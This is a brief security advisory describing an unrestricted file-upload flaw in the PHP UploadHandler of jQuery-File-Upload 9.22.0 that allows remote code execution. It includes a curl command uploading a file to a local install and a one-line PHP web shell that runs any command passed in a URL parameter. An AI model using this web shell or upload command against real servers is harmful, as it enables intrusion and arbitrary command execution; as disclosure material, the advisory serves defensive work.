Advisory: http://www.vapidlabs.com/advisory.php?v=204
Vulnerability:
The code in https://github.com/blueimp/jQuery-File-Upload/blob/master/server/php/UploadHandler.php doesn't require any validation to upload files
to the server.  It also doesn't exclude file types.  This allows for remote code execution.

Exploit Code:
$ curl   -F "files=@shell.php" http://localhost/jQuery-File-Upload-9.22.0/server/php/index.php
 
Where shell.php is:
 
<?php $cmd=$_GET['cmd']; system($cmd);?>
